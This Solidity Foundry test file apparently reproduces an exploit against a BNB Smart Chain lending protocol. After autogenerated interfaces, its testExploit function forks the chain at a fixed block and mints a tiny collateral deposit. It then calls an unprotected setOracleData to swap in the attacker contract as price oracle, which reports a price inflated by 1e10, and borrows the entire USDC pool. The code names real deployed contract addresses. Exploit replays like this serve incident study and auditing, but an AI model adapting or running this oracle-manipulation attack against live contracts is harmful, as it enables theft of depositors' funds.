// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";


interface IRToken {
  event AccrueInterest(
    uint256 cashPrior,
    uint256 interestAccumulated,
    uint256 borrowIndex,
    uint256 totalBorrows
  );
  event Approval(
    address indexed owner,
    address indexed spender,
    uint256 amount
  );
  event Borrow(
    address borrower,
    uint256 borrowAmount,
    uint256 accountBorrows,
    uint256 totalBorrows
  );
  event Failure(uint256 error, uint256 info, uint256 detail);
  event LiquidateBorrow(
    address liquidator,
    address borrower,
    uint256 repayAmount,
    address rTokenCollateral,
    uint256 seizeTokens
  );
  event Mint(address minter, uint256 mintAmount, uint256 mintTokens);
  event NewAdmin(address oldAdmin, address newAdmin);
  event NewCointroller(address oldCointroller, address newCointroller);
  event NewMarketInterestRateModel(
    address oldInterestRateModel,
    address newInterestRateModel
  );
  event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);
  event NewReserveFactor(
    uint256 oldReserveFactorMantissa,
    uint256 newReserveFactorMantissa
  );
  event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);
  event RepayBorrow(
    address payer,
    address borrower,
    uint256 repayAmount,
    uint256 accountBorrows,
    uint256 totalBorrows
  );
  event ReservesAdded(
    address benefactor,
    uint256 addAmount,
    uint256 newTotalReserves
  );
  event ReservesReduced(
    address admin,
    uint256 reduceAmount,
    uint256 newTotalReserves
  );
  event Transfer(address indexed from, address indexed to, uint256 amount);

  function _acceptAdmin() external returns (uint256);

  function _addReserves(uint256 addAmount) external returns (uint256);

  function _becomeImplementation(bytes memory data) external;

  function _reduceReserves(uint256 reduceAmount) external returns (uint256);

  function _resignImplementation() external;

  function _setCointroller(address newCointroller) external returns (uint256);

  function _setInterestRateModel(address newInterestRateModel)
  external
  returns (uint256);

  function _setPendingAdmin(address newPendingAdmin) external returns (uint256);

  function _setReserveFactor(uint256 newReserveFactorMantissa)
  external
  returns (uint256);

  function accrualBlockNumber() external view returns (uint256);

  function accrueInterest() external returns (uint256);

  function admin() external view returns (address);

  function allowance(address owner, address spender)
  external
  view
  returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function balanceOf(address owner) external view returns (uint256);

  function balanceOfUnderlying(address owner) external returns (uint256);

  function borrow(uint256 borrowAmount) external returns (uint256);

  function borrowBalanceCurrent(address account) external returns (uint256);

  function borrowBalanceStored(address account) external view returns (uint256);

  function borrowIndex() external view returns (uint256);

  function borrowRatePerBlock() external view returns (uint256);

  function cointroller() external view returns (address);

  function decimals() external view returns (uint8);

  function exchangeRateCurrent() external returns (uint256);

  function exchangeRateStored() external view returns (uint256);

  function getAccountSnapshot(address account)
  external
  view
  returns (
    uint256,
    uint256,
    uint256,
    uint256
  );

  function getCash() external view returns (uint256);

  function implementation() external view returns (address);

  function initialize(
    address underlying_,
    address cointroller_,
    address interestRateModel_,
    uint256 initialExchangeRateMantissa_,
    string memory name_,
    string memory symbol_,
    uint8 decimals_
  ) external;

  function initialize(
    address cointroller_,
    address interestRateModel_,
    uint256 initialExchangeRateMantissa_,
    string memory name_,
    string memory symbol_,
    uint8 decimals_
  ) external;

  function interestRateModel() external view returns (address);

  function isRToken() external view returns (bool);

  function liquidateBorrow(
    address borrower,
    uint256 repayAmount,
    address rTokenCollateral
  ) external returns (uint256);

  function mint() external payable;

  function mint(uint256 mintAmount) external returns (uint256);

  function name() external view returns (string memory);

  function pendingAdmin() external view returns (address);

  function redeem(uint256 redeemTokens) external returns (uint256);

  function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

  function repayBorrow(uint256 repayAmount) external returns (uint256);

  function repayBorrowBehalf(address borrower, uint256 repayAmount)
  external
  returns (uint256);

  function reserveFactorMantissa() external view returns (uint256);

  function seize(
    address liquidator,
    address borrower,
    uint256 seizeTokens
  ) external returns (uint256);

  function supplyRatePerBlock() external view returns (uint256);

  function sweepToken(address token) external;

  function symbol() external view returns (string memory);

  function totalBorrows() external view returns (uint256);

  function totalBorrowsCurrent() external returns (uint256);

  function totalReserves() external view returns (uint256);

  function totalSupply() external view returns (uint256);

  function transfer(address dst, uint256 amount) external returns (bool);

  function transferFrom(
    address src,
    address dst,
    uint256 amount
  ) external returns (bool);

  function underlying() external view returns (address);
}

interface ICointroller {
  event ActionPaused(string action, bool pauseState);
  event ActionPaused(address rToken, string action, bool pauseState);
  event ContributorRifiSpeedUpdated(
    address indexed contributor,
    uint256 newSpeed
  );
  event DistributedBorrowerRifi(
    address indexed rToken,
    address indexed borrower,
    uint256 rifiDelta,
    uint256 rifiBorrowIndex
  );
  event DistributedSupplierRifi(
    address indexed rToken,
    address indexed supplier,
    uint256 rifiDelta,
    uint256 rifiSupplyIndex
  );
  event Failure(uint256 error, uint256 info, uint256 detail);
  event MarketEntered(address rToken, address account);
  event MarketExited(address rToken, address account);
  event MarketListed(address rToken);
  event NewBorrowCap(address indexed rToken, uint256 newBorrowCap);
  event NewBorrowCapGuardian(
    address oldBorrowCapGuardian,
    address newBorrowCapGuardian
  );
  event NewCloseFactor(
    uint256 oldCloseFactorMantissa,
    uint256 newCloseFactorMantissa
  );
  event NewCollateralFactor(
    address rToken,
    uint256 oldCollateralFactorMantissa,
    uint256 newCollateralFactorMantissa
  );
  event NewLiquidationIncentive(
    uint256 oldLiquidationIncentiveMantissa,
    uint256 newLiquidationIncentiveMantissa
  );
  event NewPauseGuardian(address oldPauseGuardian, address newPauseGuardian);
  event NewPriceOracle(address oldPriceOracle, address newPriceOracle);
  event RifiGranted(address recipient, uint256 amount);
  event RifiSpeedUpdated(address indexed rToken, uint256 newSpeed);

  function _become(address unitroller) external;

  function _borrowGuardianPaused() external view returns (bool);

  function _grantRifi(address recipient, uint256 amount) external;

  function _mintGuardianPaused() external view returns (bool);

  function _setBorrowCapGuardian(address newBorrowCapGuardian) external;

  function _setBorrowPaused(address rToken, bool state) external returns (bool);

  function _setCloseFactor(uint256 newCloseFactorMantissa)
  external
  returns (uint256);

  function _setCollateralFactor(
    address rToken,
    uint256 newCollateralFactorMantissa
  ) external returns (uint256);

  function _setContributorRifiSpeed(address contributor, uint256 rifiSpeed)
  external;

  function _setLiquidationIncentive(uint256 newLiquidationIncentiveMantissa)
  external
  returns (uint256);

  function _setMarketBorrowCaps(
    address[] memory rTokens,
    uint256[] memory newBorrowCaps
  ) external;

  function _setMintPaused(address rToken, bool state) external returns (bool);

  function _setPauseGuardian(address newPauseGuardian)
  external
  returns (uint256);

  function _setPriceOracle(address newOracle) external returns (uint256);

  function _setRifiSpeed(address rToken, uint256 rifiSpeed) external;

  function _setSeizePaused(bool state) external returns (bool);

  function _setTransferPaused(bool state) external returns (bool);

  function _supportMarket(address rToken) external returns (uint256);

  function accountAssets(address, uint256) external view returns (address);

  function admin() external view returns (address);

  function allMarkets(uint256) external view returns (address);

  function borrowAllowed(
    address rToken,
    address borrower,
    uint256 borrowAmount
  ) external returns (uint256);

  function borrowCapGuardian() external view returns (address);

  function borrowCaps(address) external view returns (uint256);

  function borrowGuardianPaused(address) external view returns (bool);

  function borrowVerify(
    address rToken,
    address borrower,
    uint256 borrowAmount
  ) external;

  function checkMembership(address account, address rToken)
  external
  view
  returns (bool);

  function claimRifi(
    address[] memory holders,
    address[] memory rTokens,
    bool borrowers,
    bool suppliers
  ) external;

  function claimRifi(address holder, address[] memory rTokens) external;

  function claimRifi(address holder) external;

  function closeFactorMantissa() external view returns (uint256);

  function cointrollerImplementation() external view returns (address);

  function enterMarkets(address[] memory rTokens)
  external
  returns (uint256[] memory);

  function exitMarket(address rTokenAddress) external returns (uint256);

  function getAccountLiquidity(address account)
  external
  view
  returns (
    uint256,
    uint256,
    uint256
  );

  function getAllMarkets() external view returns (address[] memory);

  function getAssetsIn(address account)
  external
  view
  returns (address[] memory);

  function getBlockNumber() external view returns (uint256);

  function getHypotheticalAccountLiquidity(
    address account,
    address rTokenModify,
    uint256 redeemTokens,
    uint256 borrowAmount
  )
  external
  view
  returns (
    uint256,
    uint256,
    uint256
  );

  function getRifiAddress() external view returns (address);

  function initialize(address rifi) external;

  function isCointroller() external view returns (bool);

  function lastContributorBlock(address) external view returns (uint256);

  function liquidateBorrowAllowed(
    address rTokenBorrowed,
    address rTokenCollateral,
    address liquidator,
    address borrower,
    uint256 repayAmount
  ) external returns (uint256);

  function liquidateBorrowVerify(
    address rTokenBorrowed,
    address rTokenCollateral,
    address liquidator,
    address borrower,
    uint256 actualRepayAmount,
    uint256 seizeTokens
  ) external;

  function liquidateCalculateSeizeTokens(
    address rTokenBorrowed,
    address rTokenCollateral,
    uint256 actualRepayAmount
  ) external view returns (uint256, uint256);

  function liquidationIncentiveMantissa() external view returns (uint256);

  function markets(address)
  external
  view
  returns (
    bool isListed,
    uint256 collateralFactorMantissa,
    bool isRified
  );

  function maxAssets() external view returns (uint256);

  function mintAllowed(
    address rToken,
    address minter,
    uint256 mintAmount
  ) external returns (uint256);

  function mintGuardianPaused(address) external view returns (bool);

  function mintVerify(
    address rToken,
    address minter,
    uint256 actualMintAmount,
    uint256 mintTokens
  ) external;

  function oracle() external view returns (address);

  function pauseGuardian() external view returns (address);

  function pendingAdmin() external view returns (address);

  function pendingCointrollerImplementation() external view returns (address);

  function redeemAllowed(
    address rToken,
    address redeemer,
    uint256 redeemTokens
  ) external returns (uint256);

  function redeemVerify(
    address rToken,
    address redeemer,
    uint256 redeemAmount,
    uint256 redeemTokens
  ) external;

  function repayBorrowAllowed(
    address rToken,
    address payer,
    address borrower,
    uint256 repayAmount
  ) external returns (uint256);

  function repayBorrowVerify(
    address rToken,
    address payer,
    address borrower,
    uint256 actualRepayAmount,
    uint256 borrowerIndex
  ) external;

  function rifiAccrued(address) external view returns (uint256);

  function rifiBorrowState(address)
  external
  view
  returns (uint224 index, uint32 block);

  function rifiBorrowerIndex(address, address) external view returns (uint256);

  function rifiContributorSpeeds(address) external view returns (uint256);

  function rifiInitialIndex() external view returns (uint224);

  function rifiRate() external view returns (uint256);

  function rifiSpeeds(address) external view returns (uint256);

  function rifiSupplierIndex(address, address) external view returns (uint256);

  function rifiSupplyState(address)
  external
  view
  returns (uint224 index, uint32 block);

  function seizeAllowed(
    address rTokenCollateral,
    address rTokenBorrowed,
    address liquidator,
    address borrower,
    uint256 seizeTokens
  ) external returns (uint256);

  function seizeGuardianPaused() external view returns (bool);

  function seizeVerify(
    address rTokenCollateral,
    address rTokenBorrowed,
    address liquidator,
    address borrower,
    uint256 seizeTokens
  ) external;

  function transferAllowed(
    address rToken,
    address src,
    address dst,
    uint256 transferTokens
  ) external returns (uint256);

  function transferGuardianPaused() external view returns (bool);

  function transferVerify(
    address rToken,
    address src,
    address dst,
    uint256 transferTokens
  ) external;

  function updateContributorRewards(address contributor) external;
}

interface ISimplePriceOracle {
  event PricePosted(
    address asset,
    uint256 previousPriceMantissa,
    uint256 requestedPriceMantissa,
    uint256 newPriceMantissa
  );

  function getUnderlyingPrice(address rToken) external view returns (uint256);

  function isPriceOracle() external view returns (bool);

  function oracleData(address) external view returns (address);

  function setOracleData(address rToken, address _oracle) external;
}

interface IPriceFeed {
  function decimals() external view returns (uint8);

  function description() external view returns (string memory);

  function version() external view returns (uint256);

  function getRoundData(uint80 _roundId)
  external
  view
  returns (
    uint80 roundId,
    int256 answer,
    uint256 startedAt,
    uint256 updatedAt,
    uint80 answeredInRound
  );

  function latestRoundData()
  external
  view
  returns (
    uint80 roundId,
    int256 answer,
    uint256 startedAt,
    uint256 updatedAt,
    uint80 answeredInRound
  );

  function fetchPrice() external returns (uint256);
}


contract ContractTest is DSTest {
  IERC20 usdc = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
  IRToken rbnb = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);
  IRToken rusdc = IRToken(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5);
  ICointroller cointroller =
    ICointroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
  ISimplePriceOracle simplePriceOracle =
    ISimplePriceOracle(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);
  IPriceFeed chainlinkBNBUSDPriceFeed =
    IPriceFeed(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  function setUp() public {
    cheats.createSelectFork("bsc", 16956474); //fork bsc at block 16956474
  }

  function testExploit() public {
    emit log_named_uint(
      "Before exploit, USDC balance of attacker:",
      usdc.balanceOf(address(this))
    );
    rbnb.approve(address(cointroller), type(uint256).max);
    address[] memory rTokens = new address[](1);
    rTokens[0] = address(rbnb);
    cointroller.enterMarkets(rTokens);
    rbnb.mint{ value: 100000000000000 }();
    simplePriceOracle.setOracleData(address(rbnb), address(this));
    rusdc.borrow(rusdc.getCash());
    rusdc.transfer(msg.sender, rusdc.balanceOf(address(this)));
    simplePriceOracle.setOracleData(
      address(rbnb),
      address(chainlinkBNBUSDPriceFeed)
    );
    emit log_named_uint(
      "After exploit, USDC balance of attacker:",
      usdc.balanceOf(address(this))
    );
  }

  function decimals() external view returns (uint8) {
    return chainlinkBNBUSDPriceFeed.decimals();
  }

  function latestRoundData()
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    )
  {
    (
      roundId,
      answer,
      startedAt,
      updatedAt,
      answeredInRound
    ) = chainlinkBNBUSDPriceFeed.latestRoundData();
    answer = answer * 1e10;
  }
}